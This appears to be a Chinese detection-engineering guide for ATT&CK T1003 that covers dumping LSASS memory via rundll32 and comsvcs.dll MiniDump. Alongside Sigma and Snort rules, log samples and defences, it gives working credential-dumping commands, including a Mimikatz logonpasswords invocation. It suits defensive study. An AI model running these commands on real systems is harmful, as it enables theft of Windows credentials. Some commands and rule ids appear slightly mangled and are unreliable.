# T1003-Win-使用Comsvcs.dll转储Lsass.exe内存

## 描述

凭据转储是指攻击者从操作系统或软件中提取账户登录名和密码（明文或哈希）以进行横向移动或访问受限资源。Windows系统中，登录凭据存储在本地安全机构子系统服务（LSASS）进程内存中。攻击者可通过调用系统内置的`comsvcs.dll`（位于`C:\Windows\System32\`）中的`MiniDump`函数，使用`rundll32.exe`转储`lsass.exe`内存，生成`.dmp`文件，随后离线使用Mimikatz等工具提取凭据。此技术利用系统原生组件，隐蔽性强，但需管理员权限，且可能被EDR或杀毒软件检测。

## 测试案例

**测试环境**：
- 系统：Windows Server 2016/2019或Windows10
- 工具：rundll32.exe、comsvcs.dll（系统内置）、Mimikatz（可选，离线分析）
- 要求：管理员权限、域环境（可选，lab.local）、启用Sysmon和PowerShell日志
- 用户：Administrator（测试账户）

**测试准备**：
1. 确保以管理员身份登录（普通用户需提权）。
2. 安装Sysmon（配置事件ID 1：进程创建，11：文件操作，10：进程访问）。
3. 启用PowerShell日志（组策略：计算机配置>管理模板>Windows组件>WindowsPowerShell>启用模块日志）。
4. 启用Windows安全日志审计（组策略：计算机配置>策略>Windows设置>安全设置>本地策略>审核策略>进程跟踪、对象访问）。
5. 下载Mimikatz（<https://github.com/gentilkiwi/mimikatz>）用于离线凭据提取（可选）。
6. 使用`tasklist|findstrlsass.exe`获取`lsass.exe`的PID。

**测试步骤**：
1. **获取lsass.exe的PID**：
   ```cmd
   tasklist|findstrlsass.exe
   ```
   预期输出：
   ```
   lsass.exe648Services09,876K
   ```
2. **使用rundll32调用comsvcs.dll转储LSASS内存**：
   ```powershell
   rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\AtomicRedTeam\lsass.dmp full
   ```
   或通过PowerShell动态获取PID：
   ```powershell
   C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Processlsass).id $env:TEMP\lsass-comsvcs.dmp full
   ```
   预期结果：生成`lsass.dmp`或`lsass-comsvcs.dmp`（约50-100MB）。
3. **验证转储文件**：
   - 导航到指定路径（如`C:\AtomicRedTeam\`或`%TEMP%`），确认`.dmp`文件存在。
4. **离线提取凭据**（可选）：
   - 将`.dmp`文件传输到本地分析系统（通过SMB、USB等）。
   - 使用Mimikatz提取凭据：
     ```cmd
     mimikatz.exe "sekurlsa::minidumplsass.dmp" "sekurlsa::logonpasswords" exit
     ```
     预期输出：
     ```
     msv:
       *Username:Administrator
       *Domain:LAB
       *NTLM:<NTLMHash>
     wdigest:
       *Username:Administrator
       *Domain:LAB
       *Password:Password123
     ```

**参考资源**：
- comsvcs.dll转储技术：<https://www.cnblogs.com/Yang34/p/14418572.html>
- Windows凭据提取：<https://blog.csdn.net/xiangshen1990/article/details/104865393>
- MITREATT&CKT1003：<https://attack.mitre.org/techniques/T1003/>

## 检测日志

**数据来源**：
- **Sysmon日志**（推荐）：
  - 事件ID1：进程创建（rundll32.exe）
  - 事件ID10：进程访问（rundll32.exe访问lsass.exe）
  - 事件ID11：文件操作（lsass.dmp创建）
- **Windows安全日志**：
  - 事件ID4688：新进程创建（rundll32.exe）
  - 事件ID4656：文件访问（需启用对象访问审计，捕获lsass.dmp）
- **PowerShell日志**：
  - 事件ID400：PowerShell引擎启动
  - 事件ID4103/4104：PowerShell命令执行（若通过PowerShell调用）
- **网络流量**：
  - 捕获`.dmp`文件传输（SMB445/TCP、FTP21/TCP等）。

**关键日志字段**：
- 事件ID1（Sysmon）：
  - `Image`：C:\Windows\System32\rundll32.exe
  - `CommandLine`：包含`comsvcs.dll`和`MiniDump`
  - `ParentImage`：powershell.exe或cmd.exe
- 事件ID10（Sysmon）：
  - `SourceImage`：C:\Windows\System32\rundll32.exe
  - `TargetImage`：C:\Windows\System32\lsass.exe
- 事件ID11（Sysmon）：
  - `TargetFilename`：C:\AtomicRedTeam\lsass.dmp或%TEMP%\lsass-comsvcs.dmp
- 事件ID4688（Windows安全日志）：
  - `ProcessName`：C:\Windows\System32\rundll32.exe
  - `CommandLine`：C:\Windows\System32\rundll32.exeC:\Windows\System32\comsvcs.dllMiniDump<PID><path>\lsass.dmpfull
- 事件ID400（PowerShell）：
  - `HostApplication`：powershell.exe-crundll32...

## 测试复现

**环境配置**：
- 系统：Windows Server 2016
- 工具：rundll32.exe、comsvcs.dll（内置）
- 用户：Administrator（密码：Password123）
- 日志：Sysmon（事件ID1、10、11）、PowerShell（事件ID400）
- 路径：C:\AtomicRedTeam\

**复现步骤**：
1. 获取lsass.exe的PID：
   ```cmd
   C:\>tasklist|findstrlsass.exe
   lsass.exe648Services09,876K
   ```
2. 执行转储命令：
   ```powershell
   C:\>powershell -c "rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\AtomicRedTeam\lsass.dmp full"
   ```
   或动态获取PID：
   ```powershell
   C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Processlsass).id $env:TEMP\lsass-comsvcs.dmp full
   ```
3. 验证转储文件：
   - 检查`C:\AtomicRedTeam\lsass.dmp`或`%TEMP%\lsass-comsvcs.dmp`是否存在。
4. （可选）离线分析：
   - 传输`lsass.dmp`到本地系统。
   - 使用Mimikatz：
     ```cmd
     C:\Tools\mimikatz>mimikatz.exe "sekurlsa::minidumplsass.dmp" "sekurlsa::logonpasswords" exit
     wdigest:
       *Username:Administrator
       *Domain:LAB
       *Password:Password123
     ```
5. 验证日志：
   - Sysmon：事件ID1（rundll32.exe）、11（lsass.dmp创建）。
   - PowerShell：事件ID400（powershell.exe调用rundll32）。
   - Windows安全日志：事件ID4688（rundll32.exe进程创建）。

## 测试留痕

**Sysmon日志**：
- **事件ID1**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="Image">C:\Windows\System32\rundll32.exe</Data>
      <DataName="CommandLine">"C:\Windows\System32\rundll32.exe "C:\Windows\System32\comsvcs.dll MiniDump 648 C:\AtomicRedTeam\lsass.dmp full</Data>
      <DataName="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <DataName="User">LAB\Administrator</Data>
    </EventData>
  </Event>
  ```
- **事件ID10**（进程访问）：
  ```xml
  <Event>
    <EventData>
      <DataName="SourceImage">C:\Windows\System32\rundll32.exe</Data>
      <DataName="TargetImage">C:\Windows\System32\lsass.exe</Data>
      <DataName="CallTrace">rundll32.exe|comsvcs.dll|ntdll.dll</Data>
    </EventData>
  </Event>
  ```
- **事件ID11**（文件创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetFilename">C:\AtomicRedTeam\lsass.dmp</Data>
      <DataName="Image">C:\Windows\System32\rundll32.exe</Data>
      <DataName="User">LAB\Administrator</Data>
    </EventData>
  </Event>
  ```

**Windows安全日志**：
- **事件ID4688**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <DataName="ProcessName">C:\Windows\System32\rundll32.exe</Data>
      <DataName="CommandLine">"C:\Windows\System32\rundll32.exe "C:\Windows\System32\comsvcs.dll MiniDump 648 C:\AtomicRedTeam\lsass.dmp full</Data>
      <DataName="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <DataName="SubjectUserName">Administrator</Data>
      <DataName="TokenElevationType">%%1936</Data>
    </EventData>
  </Event>
  ```

**PowerShell日志**：
- **事件ID400**（引擎启动）：
  ```xml
  <Event>
    <EventData>
      <DataName="HostApplication">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\AtomicRedTeam\lsass.dmp full</Data>
      <DataName="NewEngineState">Available</Data>
      <DataName="PreviousEngineState">None</Data>
      <DataName="RunspaceId">af860283-73a9-452c-a1cd-ea808dbaf232</Data>
    </EventData>
  </Event>
  ```

**文件系统**：
- 文件：`C:\AtomicRedTeam\lsass.dmp`或`%TEMP%\lsass-comsvcs.dmp`（约50-100MB）

## 检测规则/思路

### Sigma规则

**规则一：检测rundll32调用comsvcs.dll转储LSASS**：
```yaml
title: Rundll32调用comsvcs.dll转储LSASS检测
id: l2g3h4i5-6j7k-8l9m-gn8h-5i6j7k8l9m0n
status: stable
description: 检测通过rundll32调用comsvcs.dll的MiniDump函数转储LSASS内存的行为
references:
  -https://attack.mitre.org/techniques/T1003/
  -https://www.cnblogs.com/Yang34/p/14418572.html
tags:
  -attack.credential_access
  -attack.t1003
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    EventID|in:
      -4688
      -1
    Image|endswith: '\rundll32.exe'
    CommandLine|contains:
      -'comsvcs.dll'
      -'MiniDump'
      -'.dmp'
  condition: selection
fields:
  -ComputerName
  -User
  -Image
  -CommandLine
  -ParentImage
falsepositives:
  -管理员合法使用rundll32进行系统调试
  -第三方软件调用comsvcs.dll
level: critical
```

**规则二：检测comsvcs.dll创建LSASS转储文件**：
```yaml
title: comsvcs.dll创建LSASS转储文件检测
id: m3h4i5j6-7k8l-9m0n-ho9i-6j7k8l9m0n1o
status: stable
description: 检测rundll32通过comsvcs.dll创建LSASS转储文件的行为
references:
  -https://attack.mitre.org/techniques/T1003/
tags:
  -attack.credential_access
  -attack.t1003
logsource:
  category: file_event
  product: windows
detection:
  selection:
    EventID:11
    Image|endswith: '\rundll32.exe'
    TargetFilename|contains: '.dmp'
  condition: selection
fields:
  -ComputerName
  -User
  -Image
  -TargetFilename
falsepositives:
  -合法调试工具生成转储文件
level: high
```

**规则优化说明**：
- 规则一：聚焦`rundll32.exe`的命令行，检测`comsvcs.dll`和`MiniDump`的调用。
- 规则二：监控Sysmon事件ID11，检测`rundll32.exe`创建`.dmp`文件。
- 考虑`comsvcs.dll`路径变体（如非`System32`），但需平衡误报。

### 检测思路

1. **日志监控**：
   - 监控Sysmon事件ID1/4688，检测`rundll32.exe`执行，命令行包含`comsvcs.dll`和`MiniDump`。
   - 监控事件ID10，检测`rundll32.exe`访问`lsass.exe`。
   - 监控事件ID11，检测`.dmp`文件创建（如lsass.dmp）。
   - 监控PowerShell事件ID400/4104，捕获通过PowerShell调用rundll32的行为。

2. **行为分析**：
   - 检测非管理员用户以管理员权限运行`rundll32.exe`。
   - 监控短时间内多次`.dmp`文件生成或`lsass.exe`访问。

3. **文件监控**：
   - 启用文件审计，监控`%TEMP%`或自定义路径（如`C:\AtomicRedTeam\`）的`.dmp`文件创建。
   - 检查`comsvcs.dll`的异常加载（如非`C:\Windows\System32\`路径）。

4. **网络监控**：
   - 捕获`.dmp`文件传输流量（SMB445/TCP、FTP21/TCP）。
   - 示例Snort规则：
     ```snort
     alerttcpanyany->any445(msg:"LSASSDMPFileTransfer";content:".dmp";sid:1000007;)
     ```

5. **关联分析**：
   - 结合事件ID4624（登录成功），检测转储后的异常登录。
   - 监控Mimikatz执行（事件ID1，`mimikatz.exe`）。

## 防御建议

1. **权限管理**：
   - 限制普通用户对`lsass.exe`和`comsvcs.dll`的访问权限（通过组策略）。
   - 仅允许必要管理员运行`rundll32.exe`高权限操作。

2. **日志与监控**：
   - 部署Sysmon，启用事件ID1、10、11。
   - 启用PowerShell日志（事件ID400、4103/4104）。
   - 启用对象访问审计，监控`%TEMP%\*.dmp`和`lsass.exe`。
   - 使用SIEM（如Splunk）关联`rundll32.exe`、`comsvcs.dll`和`.dmp`文件创建。

3. **凭据保护**：
   - 启用CredentialGuard（Windows10/2016+），防止LSASS存储明文凭据。
   - 禁用WDigest协议（组策略：计算机配置>管理模板>MSSecurityGuide>WDigestAuthentication）。

4. **工具限制**：
   - 使用AppLocker或WDAC限制`rundll32.exe`加载非签名DLL。
   - 监控`comsvcs.dll`的非标准路径加载。
   - 阻止Mimikatz等工具运行。

5. **主动防御**：
   - 部署诱捕凭据（HoneyCredentials），监控异常LSASS访问。
   - 使用EDR工具检测`rundll32.exe`异常行为或`.dmp`文件生成。
   - 安装终端防护软件（如360安全卫士），增强对`comsvcs.dll`滥用的检测。

## 参考推荐

- MITREATT&CK:CredentialDumping(T1003)  
  <https://attack.mitre.org/techniques/T1003/>
- comsvcs.dll转储技术  
  <https://www.cnblogs.com/Yang34/p/14418572.html>
- Windows凭据提取  
  <https://blog.csdn.net/xiangshen1990/article/details/104865393>
- Mimikatz文档  
  <https://github.com/gentilkiwi/mimikatz>
- LSASS凭据提取防御  
  <https://adsecurity.org/?p=1760>
- Rundll32参考  
  <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32>